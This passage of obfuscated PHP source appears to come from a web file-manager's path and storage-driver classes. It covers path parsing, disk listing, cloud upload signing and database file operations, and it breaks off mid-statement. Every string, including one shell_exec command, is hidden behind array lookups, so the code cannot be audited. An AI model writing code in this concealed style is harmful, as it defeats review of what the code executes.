$ˆù”È·[$ƒ×–ëÖ[437]] = $¤åŠÎ¥[3]; } $ˆù”È·[$ƒ×–ëÖ[1197]] = $¤åŠÎ¥[4]; } $ğÜ¾«²ª = array($ƒ×–ëÖ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ˆù”È·[$ƒ×–ëÖ[1262]] = in_array($ˆù”È·[$ƒ×–ëÖ[33]], $ğÜ¾«²ª); return $ˆù”È·; } public static function isTruePath($Ğ®üŒ¢•) { $›äêÛùˆ =& $_SERVER[”ú…±Ú¥]; if (substr($Ğ®üŒ¢•, 0, 1) != $›äêÛùˆ[1298]) { return !0; } if (strpos($Ğ®üŒ¢•, $›äêÛùˆ[446]) === 0) { return !0; } if (strpos($Ğ®üŒ¢•, $›äêÛùˆ[1266]) === 0) { return !0; } if (strpos($Ğ®üŒ¢•, $›äêÛùˆ[1300]) === 0) { return !0; } if (strpos($Ğ®üŒ¢•, $›äêÛùˆ[1301]) === 0) { return !0; } if (strpos($Ğ®üŒ¢•, $›äêÛùˆ[1302]) === 0) { return !0; } return !1; } public static function clear($¶¬ÙÜóÖ) { $— Üúá‹ =& $_SERVER[”ú…±Ú¥]; $¶¬ÙÜóÖ = str_replace(array($— Üúá‹[1107], $— Üúá‹[191]), $— Üúá‹[53], $¶¬ÙÜóÖ); $¶¬ÙÜóÖ = str_replace($— Üúá‹[97], $— Üúá‹[8], $¶¬ÙÜóÖ); $†ò÷Úï = $— Üúá‹[1303]; if (substr($¶¬ÙÜóÖ, 0, 3) == $— Üúá‹[1304]) { $¶¬ÙÜóÖ = substr($¶¬ÙÜóÖ, 3); } while (strstr($¶¬ÙÜóÖ, $†ò÷Úï)) { $¶¬ÙÜóÖ = str_replace($†ò÷Úï, $— Üúá‹[8], $¶¬ÙÜóÖ); } $¶¬ÙÜóÖ = preg_replace($— Üúá‹[1305], $— Üúá‹[8], $¶¬ÙÜóÖ); if ($¶¬ÙÜóÖ == $— Üúá‹[8]) { return $— Üúá‹[8]; } $¶¬ÙÜóÖ = rtrim($¶¬ÙÜóÖ, $— Üúá‹[8]); return $¶¬ÙÜóÖ; } public static function pathTrue($Ë¹©Ÿèó) { $…”û¬äç =& $_SERVER[”ú…±Ú¥]; if (!$Ë¹©Ÿèó) { return $…”û¬äç[12]; } $™­ìÁíË = strlen($Ë¹©Ÿèó); if (substr($Ë¹©Ÿèó, $™­ìÁíË - 1, 1) == $…”û¬äç[8]) { $Ë¹©Ÿèó = substr($Ë¹©Ÿèó, 0, $™­ìÁíË - 1); } $Ë¹©Ÿèó = str_replace($…”û¬äç[557], $…”û¬äç[8], str_replace($…”û¬äç[1306], $…”û¬äç[8], $Ë¹©Ÿèó)); if (substr($Ë¹©Ÿèó, 0, 2) == $…”û¬äç[1307]) { $Ë¹©Ÿèó = substr($Ë¹©Ÿèó, 2); } if (!strstr($Ë¹©Ÿèó, $…”û¬äç[1304])) { return $Ë¹©Ÿèó; } $½—Ô•ºŠ = explode($…”û¬äç[8], $Ë¹©Ÿèó); $ë‡Ï±Ş¯ = array_search($…”û¬äç[1308], $½—Ô•ºŠ); if ($ë‡Ï±Ş¯ >= 0) { $½—Ô•ºŠ[$ë‡Ï±Ş¯] = -1; } if ($ë‡Ï±Ş¯ > 0) { $½—Ô•ºŠ[$ë‡Ï±Ş¯ - 1] = -1; } $Ç†ã¬ö = array(); foreach ($½—Ô•ºŠ as $Ë—“ô) { if ($Ë—“ô !== -1) { $Ç†ã¬ö[] = $Ë—“ô; } } return self::pathTrue(implode($…”û¬äç[8], $Ç†ã¬ö)); } public static function sourceID($õß©­ıÉ) { $ñâë²ú¨ =& $_SERVER[”ú…±Ú¥]; $èÊß÷ğĞ = self::parse($õß©­ıÉ); if ($èÊß÷ğĞ[$ñâë²ú¨[33]] !== self::KOD_SOURCE) { show_json(LNG($ñâë²ú¨[1309]), !1); } return $èÊß÷ğĞ[$ñâë²ú¨[437]]; } public static function make($‚ãì Œº) { if (!$‚ãì Œº) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‚ãì Œº)); } public static function makeShare($úŠ˜Ò÷ß, $ä«šŸ¬) { return self::makePath(self::KOD_SHARE_ITEM, $úŠ˜Ò÷ß, $ä«šŸ¬); } public static function makeFileTypePath($­ñøÀ‘ì) { return self::makePath(self::KOD_USER_FILE_TYPE, $­ñøÀ‘ì); } public static function makeFileTagPath($èÈ®û˜») { return self::makePath(self::KOD_USER_FILE_TAG, $èÈ®û˜»); } public static function makePath($ŸÕæ‰¼Ë, $íãŒÚĞî = '', $é¹È™Ô  = '') { $İŞ”¹£ =& $_SERVER[”ú…±Ú¥]; $‘´ßã– = substr($ŸÕæ‰¼Ë, 1, -1); $å ÆÒÉç = $İŞ”¹£[1310] . $‘´ßã– . $İŞ”¹£[1311] . $íãŒÚĞî . $İŞ”¹£[1312]; $å ÆÒÉç = $é¹È™Ô  ? $å ÆÒÉç . $é¹È™Ô  . $İŞ”¹£[8] : $å ÆÒÉç; return $å ÆÒÉç; } public static function hashPath($Ÿ¤ƒ¸¯¥, $“Ë·ˆµø = true) { $ˆåÀ–› =& $_SERVER[”ú…±Ú¥]; $õø¶•Ôß = is_array($Ÿ¤ƒ¸¯¥) ? $Ÿ¤ƒ¸¯¥ : IO::info($Ÿ¤ƒ¸¯¥); $»‰ÁË¡ = _get($õø¶•Ôß, $ˆåÀ–›[1313], $ˆåÀ–›[12]); if (!$»‰ÁË¡ && isset($õø¶•Ôß[$ˆåÀ–›[440]])) { $õø¶•Ôß = IO::info(KodIO::make($õø¶•Ôß[$ˆåÀ–›[440]])); $»‰ÁË¡ = _get($õø¶•Ôß, $ˆåÀ–›[1313], $ˆåÀ–›[12]); } if (!$»‰ÁË¡ && $“Ë·ˆµø) { $İ”èÃ¯† = KodIO::parse($õø¶•Ôß[$ˆåÀ–›[84]]); if (!$İ”èÃ¯†[$ˆåÀ–›[33]]) { $»‰ÁË¡ = IO::hashSimple($õø¶•Ôß[$ˆåÀ–›[84]]); } } if (!$»‰ÁË¡) { $»‰ÁË¡ = md5($õø¶•Ôß[$ˆåÀ–›[84]] . $õø¶•Ôß[$ˆåÀ–›[76]] . $õø¶•Ôß[$ˆåÀ–›[85]]); } return $»‰ÁË¡; } public static function hashPathSafe($¬ßµí±Ä, $Ùö±óº = true) { $Ç›Çí =& $_SERVER[”ú…±Ú¥]; $şäôÈ› = self::hashPath($¬ßµí±Ä, $Ùö±óº); return md5($şäôÈ› . $Ç›Çí[1314] . Model($Ç›Çí[802])->get($Ç›Çí[803])); } public static function initSystemPath() { $ëİåŞ‡ =& $_SERVER[”ú…±Ú¥]; if (defined($ëİåŞ‡[1315])) { return; } define($ëİåŞ‡[1315], self::systemPath($ëİåŞ‡[1316])); define($ëİåŞ‡[1317], self::systemPath($ëİåŞ‡[1318])); define($ëİåŞ‡[1319], self::systemPath($ëİåŞ‡[1320])); define($ëİåŞ‡[1321], self::systemPath($ëİåŞ‡[1322])); IOHistory::bindEvent(); } public static function systemPath($Ì³‚Ó˜ş) { $òÌØ£üô =& $_SERVER[”ú…±Ú¥]; $¡ûËŸŸÔ = $òÌØ£üô[1323] . ucfirst($Ì³‚Ó˜ş); $§„íàı½ = Model($òÌØ£üô[802])->get($¡ûËŸŸÔ); if ($§„íàı½) { return $§„íàı½; } if ($Ì³‚Ó˜ş == $òÌØ£üô[1316]) { $§„íàı½ = self::make(Model($òÌØ£üô[857])->systemRootPathAdd($òÌØ£üô[572])); } else { $§„íàı½ = self::systemPath($òÌØ£üô[1316]); $å½Ó·ƒÅ = self::sourceID($§„íàı½); $§„íàı½ = self::make(Model($òÌØ£üô[857])->mkdir($å½Ó·ƒÅ, $Ì³‚Ó˜ş)); } Model($òÌØ£üô[802])->set($¡ûËŸŸÔ, $§„íàı½); return $§„íàı½; } public static function systemFolder($Æ±ÉÚÁÅ) { $ş£÷¡¤ = IO_PATH_SYSTEM_SOURCE . $Æ±ÉÚÁÅ; $ÚÒËÓ¿ = Cache::get($ş£÷¡¤); if (!$ÚÒËÓ¿) { $›–Ï³—¬ = IO::infoFull($ş£÷¡¤); if (!$›–Ï³—¬) { $ÚÒËÓ¿ = IO::mkdir($ş£÷¡¤, REPEAT_SKIP); } else { $ÚÒËÓ¿ = $›–Ï³—¬[$_SERVER[”ú…±Ú¥][84]]; } Cache::set($ş£÷¡¤, $ÚÒËÓ¿, 3600 * 10); } return $ÚÒËÓ¿; } public static function defaultDriver() { return Model($_SERVER[”ú…±Ú¥][799])->defaultDriver(); } public static function defaultIO() { $¾’¥œºç =& $_SERVER[”ú…±Ú¥]; $Âäàöí‘ = self::defaultDriver(); return $¾’¥œºç[1324] . $Âäàöí‘[$¾’¥œºç[437]] . $¾’¥œºç[1312]; } public static function defaultDriverInit() { static $Õ‹Èì÷ = false; if ($Õ‹Èì÷) { return $Õ‹Èì÷; } $Õ‹Èì÷ = IO::init(self::defaultIO()); return $Õ‹Èì÷; } public static function fileTypeList() { $·îı  =& $_SERVER[”ú…±Ú¥]; $ÆÃíšğğ = $GLOBALS[$·îı [6]][$·îı [1325]]; foreach ($ÆÃíšğğ as $Å¢ÁŞ†¥ => $›‘–ãÛ) { $“½»€ùİ = $·îı [1326] . $Å¢ÁŞ†¥; $ú´²Îëğ = LNG($“½»€ùİ); if ($“½»€ùİ != $ú´²Îëğ) { $ÆÃíšğğ[$Å¢ÁŞ†¥][$·îı [32]] = $ú´²Îëğ; } } return $ÆÃíšğğ; } public static function diskList($£•ÊşŸÅ = true) { $–Ùäı¹ = $_SERVER[”ú…±Ú¥][1327]; if ($£•ÊşŸÅ) { $÷¬ß¨˜ó = Cache::get($–Ùäı¹); if (is_array($÷¬ß¨˜ó)) { return $÷¬ß¨˜ó; } } $÷¬ß¨˜ó = self::diskListGet(); Cache::set($–Ùäı¹, $÷¬ß¨˜ó, 60); return $÷¬ß¨˜ó; } public static function diskListGet() { $ğ³î£âú =& $_SERVER[”ú…±Ú¥]; $ÊìÖ·¦ó = array(); if ($GLOBALS[$ğ³î£âú[6]][$ğ³î£âú[1328]] == $ğ³î£âú[1329]) { $¯Ø‰ˆºÓ = $ğ³î£âú[1330]; for ($âç†‚óÅ = 0; $âç†‚óÅ < strlen($¯Ø‰ˆºÓ); $âç†‚óÅ++) { $Ãùôû€Ù = $¯Ø‰ˆºÓ[$âç†‚óÅ] . $ğ³î£âú[1331]; if (file_exists($Ãùôû€Ù)) { $ÊìÖ·¦ó[] = $Ãùôû€Ù; } } return $ÊìÖ·¦ó; } if (!function_exists($ğ³î£âú[98])) { $ÊìÖ·¦ó[] = $ğ³î£âú[867]; return $ÊìÖ·¦ó; } $ §•·›ƒ = explode($ğ³î£âú[191], shell_exec($ğ³î£âú[1332])); array_shift($ §•·›ƒ); array_pop($ §•·›ƒ); $ó†«²æû = array($ğ³î£âú[1333], $ğ³î£âú[1334], $ğ³î£âú[1335], $ğ³î£âú[1336], $ğ³î£âú[1337], $ğ³î£âú[1338], $ğ³î£âú[1339], $ğ³î£âú[1340]); foreach ($ §•·›ƒ as $¤á¦¯ã°) { $®ªÎ‹· = preg_split($ğ³î£âú[1341], $¤á¦¯ã°); $Ãùôû€Ù = $®ªÎ‹·[count($®ªÎ‹·) - 1]; if (!strstr($®ªÎ‹·[0], $ğ³î£âú[1342]) || !$Ãùôû€Ù) { continue; } $ìåàÍ÷– = rtrim($Ãùôû€Ù, $ğ³î£âú[8]) . $ğ³î£âú[8]; if (in_array($ìåàÍ÷–, $ó†«²æû)) { continue; } $ÊìÖ·¦ó[] = $ìåàÍ÷–; } return $ÊìÖ·¦ó; } public static function isSameDisk($×ş¬Ø¦®, $ş°‹ª­°) { $Í°¥„¾± =& $_SERVER[”ú…±Ú¥]; if ($GLOBALS[$Í°¥„¾±[6]][$Í°¥„¾±[1328]] == $Í°¥„¾±[1329]) { return strtolower(substr($×ş¬Ø¦®, 0, 1)) == strtolower(substr($ş°‹ª­°, 0, 1)); } $ª¿¦öäå = self::diskList(); $ä’÷è®ù = !1; $®ê»ïÅ = !1; sort($ª¿¦öäå); $ª¿¦öäå = array_reverse($ª¿¦öäå); $×ş¬Ø¦® = rtrim($×ş¬Ø¦®, $Í°¥„¾±[8]) . $Í°¥„¾±[8]; $ş°‹ª­° = rtrim($ş°‹ª­°, $Í°¥„¾±[8]) . $Í°¥„¾±[8]; foreach ($ª¿¦öäå as $­Õõòóò) { $´¿œâ™ = strlen($­Õõòóò); if (!$ä’÷è®ù && substr($×ş¬Ø¦®, 0, $´¿œâ™) == $­Õõòóò) { $ä’÷è®ù = $­Õõòóò; } if (!$®ê»ïÅ && substr($ş°‹ª­°, 0, $´¿œâ™) == $­Õõòóò) { $®ê»ïÅ = $­Õõòóò; } if ($ä’÷è®ù && $®ê»ïÅ) { break; } } return $ä’÷è®ù === $®ê»ïÅ; } public static function transferType($óïë¦÷¾, $ö“õÒó†) { $Ù¨şµƒª =& $_SERVER[”ú…±Ú¥]; $‘æ‰ÙŠÈ = self::driverType($óïë¦÷¾); $© ”ğ… = self::driverType($ö“õÒó†); if ($‘æ‰ÙŠÈ[$Ù¨şµƒª[33]] == $© ”ğ…[$Ù¨şµƒª[33]] && $‘æ‰ÙŠÈ[$Ù¨şµƒª[1343]] == $© ”ğ…[$Ù¨şµƒª[1343]]) { return $Ù¨şµƒª[1344]; } if ($‘æ‰ÙŠÈ[$Ù¨şµƒª[33]] == $Ù¨şµƒª[900] && $© ”ğ…[$Ù¨şµƒª[33]] == $Ù¨şµƒª[106]) { return $Ù¨şµƒª[1223]; } if ($‘æ‰ÙŠÈ[$Ù¨şµƒª[33]] == $Ù¨şµƒª[106] && $© ”ğ…[$Ù¨şµƒª[33]] == $Ù¨şµƒª[900]) { return $Ù¨şµƒª[107]; } return $Ù¨şµƒª[1345]; } public static function driverType($’£¶âºò) { $ú‰‘â =& $_SERVER[”ú…±Ú¥]; $í½Îó©ü = str_replace($ú‰‘â[1346], $ú‰‘â[12], strtolower($’£¶âºò->getType())); if ($í½Îó©ü == $ú‰‘â[789] || $í½Îó©ü == $ú‰‘â[1347] || $í½Îó©ü == $ú‰‘â[1348]) { $’£¶âºò = self::defaultDriverInit(); } else { if ($í½Îó©ü == $ú‰‘â[1233] || $í½Îó©ü == $ú‰‘â[1349]) { $’£¶âºò = IO::init($’£¶âºò->pathParse[$ú‰‘â[1180]]); } } $šÈŠç™§ = $’£¶âºò->path; $í½Îó©ü = str_replace($ú‰‘â[1346], $ú‰‘â[12], strtolower($’£¶âºò->getType())); if ($í½Îó©ü == $ú‰‘â[106]) { return array($ú‰‘â[33] => $ú‰‘â[106], $ú‰‘â[1343] => $ú‰‘â[12], $ú‰‘â[84] => $šÈŠç™§, $ú‰‘â[95] => $’£¶âºò); } return array($ú‰‘â[33] => $ú‰‘â[900], $ú‰‘â[1343] => $’£¶âºò->pathDriver, $ú‰‘â[84] => $šÈŠç™§, $ú‰‘â[95] => $’£¶âºò); } public static function pathDriverType($úìÏ¤‰) { return $úìÏ¤‰ ? self::driverType(IO::init($úìÏ¤‰)) : !1; } public static function pathDriverLocal($ãÚÎØ–) { $ ë¶¯ùö =& $_SERVER[”ú…±Ú¥]; $©ª¨¤ğ = $ãÚÎØ– ? self::driverType(IO::init($ãÚÎØ–)) : !1; return $©ª¨¤ğ[$ ë¶¯ùö[33]] == $ ë¶¯ùö[106] ? !0 : !1; } public static function allowCover($ÈÀù‚Ø§, $ ‰åƒ€Ñ = true) { $¡µª«× =& $_SERVER[”ú…±Ú¥]; if (is_string($ÈÀù‚Ø§)) { $ÈÀù‚Ø§ = IO::info($ÈÀù‚Ø§); } if (!$ÈÀù‚Ø§ || $ÈÀù‚Ø§[$¡µª«×[33]] == $¡µª«×[75] || $ÈÀù‚Ø§[$¡µª«×[76]] <= 100) { return !1; } if (isset($ÈÀù‚Ø§[$¡µª«×[1350]]) || !$ÈÀù‚Ø§[$¡µª«×[84]]) { return !1; } if (isset($ÈÀù‚Ø§[$¡µª«×[212]]) && !$ÈÀù‚Ø§[$¡µª«×[212]]) { return $ÈÀù‚Ø§; } static $ş³‰òé¨ = false; if (!$ş³‰òé¨ || !$ ‰åƒ€Ñ) { $ïšÛˆ— = self::driverType(IO::init($ÈÀù‚Ø§[$¡µª«×[84]])); $“Ù¹íÄ¡ = $ïšÛˆ—[$¡µª«×[95]]; $ş³‰òé¨ = $¡µª«×[1351]; if ($ïšÛˆ—[$¡µª«×[33]] == $¡µª«×[106]) { $ş³‰òé¨ = $¡µª«×[1352]; } if ($ïšÛˆ—[$¡µª«×[95]] && is_array($ïšÛˆ—[$¡µª«×[95]]->config)) { $†—¨‰Òì = $ïšÛˆ—[$¡µª«×[95]]->config; if (isset($†—¨‰Òì[$¡µª«×[1353]]) && $†—¨‰Òì[$¡µª«×[1353]]) { $ş³‰òé¨ = $¡µª«×[1352]; } } } return $ş³‰òé¨ == $¡µª«×[1352] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($‚¬à¯ôó) { parent::__construct($‚¬à¯ôó); $this->signatureVersion($_SERVER[”ú…±Ú¥][226]); } public function uploadFormData($ùñÅ¤ÊÓ, $Š£É‰õ“ = 3600) { $”äîóÉ¦ =& $_SERVER[”ú…±Ú¥]; $ÌÓñà‹è = $”äîóÉ¦[209]; $òŒº»†Á = $”äîóÉ¦[241]; $È˜’÷®‹ = $”äîóÉ¦[251]; $¸å¾šş‰ = gmdate($”äîóÉ¦[1354], time() + $Š£É‰õ“); $æÀÍØ = (string) time() . $”äîóÉ¦[71] . (string) (time() + $Š£É‰õ“); $˜º¡ÒòÄ = array($”äîóÉ¦[252] => $¸å¾šş‰, $”äîóÉ¦[255] => array(array($”äîóÉ¦[257] => $ÌÓñà‹è), array($”äîóÉ¦[256] => $this->bucket), array($”äîóÉ¦[258], $”äîóÉ¦[259], $”äîóÉ¦[12]), array($”äîóÉ¦[262] => $È˜’÷®‹), array($”äîóÉ¦[1355] => $òŒº»†Á), array($”äîóÉ¦[1356] => $this->accessKey), array($”äîóÉ¦[1357] => $æÀÍØ))); $˜º¡ÒòÄ = json_encode($˜º¡ÒòÄ); $õäŠçÒï = hash_hmac($”äîóÉ¦[241], $æÀÍØ, $this->secret); $ µÆôÅ‘ = sha1($˜º¡ÒòÄ); $·â´İ‡ = hash_hmac($”äîóÉ¦[241], $ µÆôÅ‘, $õäŠçÒï); $ ®“ = array($”äîóÉ¦[257] => $ÌÓñà‹è, $”äîóÉ¦[262] => $È˜’÷®‹, $”äîóÉ¦[270] => base64_encode($˜º¡ÒòÄ), $”äîóÉ¦[1355] => $òŒº»†Á, $”äîóÉ¦[1356] => $this->accessKey, $”äîóÉ¦[1358] => $æÀÍØ, $”äîóÉ¦[1359] => $·â´İ‡, $”äîóÉ¦[182] => $this->getHost()); return $ ®“; } public function fileOutLink($”€‡Î¯ˆ) { $Ï­Ûèé™ =& $_SERVER[”ú…±Ú¥]; if (substr($”€‡Î¯ˆ, 0, 7) == $Ï­Ûèé™[1360]) { $”€‡Î¯ˆ = $Ï­Ûèé™[1361] . substr($”€‡Î¯ˆ, 7); } header($Ï­Ûèé™[161] . $”€‡Î¯ˆ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($­Å´„úñ) { $this->pathParse = $­Å´„úñ; $this->model = Model($_SERVER[”ú…±Ú¥][1362]); } public function getPath($‡˜²Ûô) { return trim($‡˜²Ûô, $_SERVER[”ú…±Ú¥][8]); } public function pathFather($˜ØõÃ¨ú) { $ÌÙƒ‘  = $this->parse($˜ØõÃ¨ú); $ÌÙƒ‘  = $this->infoSimple($˜ØõÃ¨ú); return $ÌÙƒ‘  ? $ÌÙƒ‘ [$_SERVER[”ú…±Ú¥][470]] : !1; } public function pathThis($§ª¾ˆ¸¾) { $ùéÍ„Ç = $this->infoSimple($§ª¾ˆ¸¾); return $ùéÍ„Ç ? $ùéÍ„Ç[$_SERVER[”ú…±Ú¥][32]] : !1; } public function getPathOuter($œ›¾Å÷Ğ) { if (!$œ›¾Å÷Ğ) { return $œ›¾Å÷Ğ; } $èÍ‹®Ö× = $this->parse($œ›¾Å÷Ğ); return KodIO::make($èÍ‹®Ö×[$_SERVER[”ú…±Ú¥][437]]); } public function copyFolderFromIO($öùÈšñĞ, $•µ·ÏÃŒ, $ËÒìŒŞÍ, $è‰­ÉŸ®, $“Å£®¬°) { $ïóñÆÑÈ = $this->model->copyFolderFromIO($öùÈšñĞ, $•µ·ÏÃŒ, $ËÒìŒŞÍ, $è‰­ÉŸ®, $“Å£®¬°); return KodIO::make($ïóñÆÑÈ); } public function isParentOf($˜ìã›ŠÕ, $°â‡úãô) { return $this->model->isParentOf($˜ìã›ŠÕ, $°â‡úãô); } public function mkfile($ú°äõ›à, $éÑ¾˜”ò = '', $ô¯Ä™æê = REPEAT_RENAME) { $³œó˜…å =& $_SERVER[”ú…±Ú¥]; $ïÊ‘ ‡´ = $this->parse($ú°äõ›à); $ú°äõ›à = $ïÊ‘ ‡´[$³œó˜…å[437]]; for ($…ïôÎ¼Ğ = 0; $…ïôÎ¼Ğ < count($ïÊ‘ ‡´[$³œó˜…å[1363]]); $…ïôÎ¼Ğ++) { $ÑÚèÉòÒ = $ïÊ‘ ‡´[$³œó˜…å[1363]][$…ïôÎ¼Ğ]; if ($…ïôÎ¼Ğ == count($ïÊ‘ ‡´[$³œó˜…å[1363]]) - 1) { $ú°äõ›à = $this->model->mkfile($ú°äõ›à, $ÑÚèÉòÒ, $éÑ¾˜”ò, $ô¯Ä™æê); break; } $ú°äõ›à = $this->model->mkdir($ú°äõ›à, $ÑÚèÉòÒ, REPEAT_SKIP); } return $this->getPathOuter($ú°äõ›à); } public function mkdir($Ç×ÖŸ², $»½Ûıí = REPEAT_SKIP) { $õ‡§ÇÜ =& $_SERVER[”ú…±Ú¥]; $ñ¹°æç = $this->parse($Ç×ÖŸ²); $Ç×ÖŸ² = $ñ¹°æç[$õ‡§ÇÜ[437]]; for ($Â¹ûÜÜ = 0; $Â¹ûÜÜ < count($ñ¹°æç[$õ‡§ÇÜ[1363]]); $Â¹ûÜÜ++) { $úæ¤‡— = $ñ¹°æç[$õ‡§ÇÜ[1363]][$Â¹ûÜÜ]; $Ç×ÖŸ² = $this->model->mkdir($Ç×ÖŸ², $úæ¤‡—, $»½Ûıí); } return $this->getPathOuter($Ç×ÖŸ²); } public function copyFile($§’±óÑá, $†æÓĞ×ı, $ø”Š‰Ëë = REPEAT_REPLACE) { $¨Ú‹¿¨× =& $_SERVER[”ú…±Ú¥]; $ê»ˆŸ = $this->parse($†æÓĞ×ı); $±íÖ…ÅÛ = $this->model->copy($§’±óÑá, $ê»ˆŸ[$¨Ú‹¿¨×[437]], $ø”Š‰Ëë, $ê»ˆŸ[$¨Ú‹¿¨×[84]]); return $±íÖ…ÅÛ ? $this->getPathOuter($±íÖ…ÅÛ) : !1; } public function moveFile($äÔæ™ , $âÛ‰Ê‡š, $¾±ç« = REPEAT_REPLACE) { $œÚ´£í– =& $_SERVER[”ú…±Ú¥]; $™à¿ëÅ‰ = $this->parse($âÛ‰Ê‡š); $œëùë– = $this->model->move($äÔæ™ , $™à¿ëÅ‰[$œÚ´£í–[437]], $¾±ç«, $™à¿ëÅ‰[$œÚ´£í–[84]]); return $œëùë– ? $this->getPathOuter($œëùë–) : !1; } public function copy($„áƒˆ—ê, $÷¬±‚Ú, $Èš§ñ¬ = REPEAT_REPLACE, $¾æËÎÎ = false) { $ò‰¿ÌÌÍ = $this->parse($÷¬±‚Ú); $ÚùĞ•ø = $this->model->copy($„áƒˆ—ê, $ò‰¿ÌÌÍ[$_SERVER[”ú…±Ú¥][437]], $Èš§ñ¬, $¾æËÎÎ); return $ÚùĞ•ø ? $this->getPathOuter($ÚùĞ•ø) : !1; } public function moveSameAllow() { } public function move($ƒªƒ×Íë, $ŸÃÎÁº, $¾ùúÄ„ = REPEAT_REPLACE, $Ô†Şš« = false) { $á¬¶ß¼Ê = $this->parse($ŸÃÎÁº); $»ãØÇËé = $this->model->move($ƒªƒ×Íë, $á¬¶ß¼Ê[$_SERVER[”ú…±Ú¥][437]], $¾ùúÄ„, $Ô†Şš«); return $»ãØÇËé ? $this->getPathOuter($»ãØÇËé) : !1; } public function remove($‹ã¤ìÚ, $½ÁŸ¹à· = true) { return $this->model->remove($‹ã¤ìÚ, $½ÁŸ¹à·); } public function rename($»¸ú¸Îö, $ˆ±†ÙŸ) { $ÌèÀÓ¯À = $this->model->rename($»¸ú¸Îö, $ˆ±†ÙŸ); return $ÌèÀÓ¯À ? $this->getPathOuter($»¸ú¸Îö) : $ÌèÀÓ¯À; } public function size($ˆÌüÀÍâ) { $Ñíşº«ç = $this->infoSimple($ˆÌüÀÍâ); return $Ñíşº«ç ? $Ñíşº«ç[$_SERVER[”ú…±Ú¥][76]] : 0; } public function infoSimple($Ÿ€Ä°“ù) { return $this->model->sourceInfo($Ÿ€Ä°“ù); } public function info($€§ƒæË‰) { return $this->infoParse($€§ƒæË‰); } public function infoAuth($…ä©ëÉ«) { return $this->infoParse($…ä©ëÉ«, !1, !0); } public function infoWithChildren($”î‚É„ì) { return $this->infoParse($”î‚É„ì, !0); } protected function infoParse($Ä şõ¨, $Ì´İŸƒ” = false, $ÍûŠÍò­ = false) { if (!$Ì´İŸƒ”) { return $this->model->pathInfo($Ä şõ¨, $ÍûŠÍò­); } return $this->model->pathInfoMore($Ä şõ¨); } public function infoFull($¦ö§œÔë) { $‹Õğ¨  =& $_SERVER[”ú…±Ú¥]; $´³ãß·ì = explode($‹Õğ¨ [8], $¦ö§œÔë); $÷è¡¦½ü = implode($‹Õğ¨ [8], array_splice($´³ãß·ì, 1)); return $this->model->pathInfoByPath($´³ãß·ì[0], $÷è¡¦½ü); } public function hashSimple($ÛïĞÁÊŸ) { $øÛ­ÔÈÏ =& $_SERVER[”ú…±Ú¥]; $î‘ÅÈ¾Ç = $this->infoWithChildren($ÛïĞÁÊŸ); return $î‘ÅÈ¾Ç[$øÛ­ÔÈÏ[170]][$øÛ­ÔÈÏ[177]]; } public function hashMd5($šß›àÊŸ) { $Îñö¶ôÂ =& $_SERVER[”ú…±Ú¥]; $Š»’²’ = $this->infoWithChildren($šß›àÊŸ); return $Š»’²’[$Îñö¶ôÂ[170]][$Îñö¶ôÂ[176]]; } public function exist($Æöœš™) { $”é£ñİÁ =& $_SERVER[”ú…±Ú¥]; $ÔÄ‘ÒÄÁ = $this->parse($Æöœš™); if (!$ÔÄ‘ÒÄÁ[$”é£ñİÁ[84]]) { return $this->isFile($Æöœš™) || $this->isFolder($Æöœš™); } $éç¹Ã„û = array($”é£ñİÁ[439] => $ÔÄ‘ÒÄÁ[$”é£ñİÁ[437]], $”é£ñİÁ[32] => $ÔÄ‘ÒÄÁ[$”é£ñİÁ[84]]); $â«”± = $this->model->where($éç¹Ã„û)->find(); return $â«”± ? !0 : !1; } public function isFile($»ªŸÃ‘Ã) { $¦ÁÏ…Î  =& $_SERVER[”ú…±Ú¥]; $ÉÆ©ÒÎ = $this->infoSimple($»ªŸÃ‘Ã); return $ÉÆ©ÒÎ && $ÉÆ©ÒÎ[$¦ÁÏ…Î [448]] == $¦ÁÏ…Î [88] ? !1 : !0; } public function isFolder($©ƒ¼²Ø¸) { $ÉôëÌŠæ =& $_SERVER[”ú…±Ú¥]; $äŠ§…İ» = $this->infoSimple($©ƒ¼²Ø¸); return $äŠ§…İ» && $äŠ§…İ»[$ÉôëÌŠæ[448]] == $ÉôëÌŠæ[88] ? !0 : !1; } public function listPath($¦ÄñÑ”É, $ù•Ø…şÀ = false) { $À—öÈ‘È =& $_SERVER[”ú…±Ú¥]; if ($¦ÄñÑ”É == $À—öÈ‘È[12]) { return !1; } $„‰Ì¸– = array($À—öÈ‘È[439] => $¦ÄñÑ”É); if ($ù•Ø…şÀ) { return $this->model->listSource($„‰Ì¸–, -1); } return $this->model->listSource($„‰Ì¸–); } public function has($Òì¸•˜ı, $ÓÜ¾ì³õ = false, $´Á‹‡ = null) { $ôíö™İê =& $_SERVER[”ú…±Ú¥]; $İÙØº¦Ö = $this->infoWithChildren($Òì¸•˜ı); if ($ÓÜ¾ì³õ) { return array($ôíö™İê[218] => $İÙØº¦Ö[$ôíö™İê[218]], $ôíö™İê[217] => $İÙØº¦Ö[$ôíö™İê[217]]); } return $´Á‹‡ ? $İÙØº¦Ö[$ôíö™İê[218]] : $İÙØº¦Ö[$ôíö™İê[217]]; } public function listAll($¡–¥çÑÛ) { $Õ­£Ü”Ú = IO::info($this->pathParse[$_SERVER[”ú…±Ú¥][84]]); if (!$Õ­£Ü”Ú) { return array(); } return $this->model->listAll($¡–¥çÑÛ); } public function getContent($ú±İäÏ·) { return $this->model->getContent($ú±İäÏ·); } public function setContent($Ú‹‡àñÒ, $åˆ‰Î«õ = '') { return $this->model->setContent($Ú‹‡àñÒ, $åˆ‰Î«õ); } public function fileSubstr($¢Æ›®, $®¿ı†ê¿, $€­¿–¿Â) { return $this->model->fileSubstr($¢Æ›®, $®¿ı†ê¿, $€­¿–¿Â); } public function download($€­ôÖùæ, $Ëá¤°¿Å = '') { $³³ÑšçÔ = get_path_father($Ëá¤°¿Å); $ÛÇ¨ğİÜ = get_path_this($Ëá¤°¿Å); $ÍÂ¹Ñª = $this->model->fileInfoGet($€­ôÖùæ); $èÜùÖ÷Ì = IO::copy($ÍÂ¹Ñª[$_SERVER[”ú…±Ú¥][84]], $³³ÑšçÔ, !1, $ÛÇ¨ğİÜ); return $èÜùÖ÷Ì; } public function setModifyTime($Â¾Éõ‘¼, $¥¹¿«Øâ = '') { $ÄäÁç‚Ÿ =& $_SERVER[”ú…±Ú¥]; if 